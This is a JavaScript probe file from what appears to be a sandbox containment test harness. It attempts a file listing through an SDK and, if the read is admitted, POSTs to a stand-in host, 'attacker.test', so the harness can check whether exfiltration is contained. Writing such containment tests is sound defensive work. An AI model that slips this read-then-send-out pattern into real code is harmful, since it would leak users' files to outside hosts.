// SPDX-License-Identifier: Apache-2.0
// Copyright 2026 CYFR Works Inc.
//
// The containment proof's declared-origin probe, run from inside a frame the
// shell created. It reads what its declaration names and sends whatever it
// got to the one origin it declares; whether the read is admitted is the
// data route's decision, and whether the send arrived is the harness's to
// see at its proxy and its recording endpoint. Nothing here asserts.

(function () {
  "use strict";

  var TIMEOUT_MS = 6000;

  function within(promise) {
    return Promise.race([
      promise,
      new Promise(function (resolve) {
        setTimeout(function () { resolve({ settled: false }); }, TIMEOUT_MS);
      })
    ]);
  }

  function read() {
    if (!window.cyfr) return Promise.resolve({ ok: false, detail: "no SDK in this page" });
    return Promise.resolve(window.cyfr.action("file.list", { path: "" })).then(
      function () { return { ok: true }; },
      function (error) {
        return { ok: false, code: error && error.code, stage: error && error.stage, message: error && error.message };
      }
    );
  }

  function send(path) {
    return fetch("https://attacker.test" + path, { method: "POST", body: "read" }).then(
      function () { return true; },
      function () { return true; }
    );
  }

  window.__declared = {
    run: function () {
      return within(read().then(function (answer) {
        if (!answer.ok) return { settled: true, read: answer, sent: false };
        return send("/declared-sent").then(function () { return { settled: true, read: answer, sent: true }; });
      }));
    }
  };

  document.getElementById("results").dataset.ready = "yes";
})();
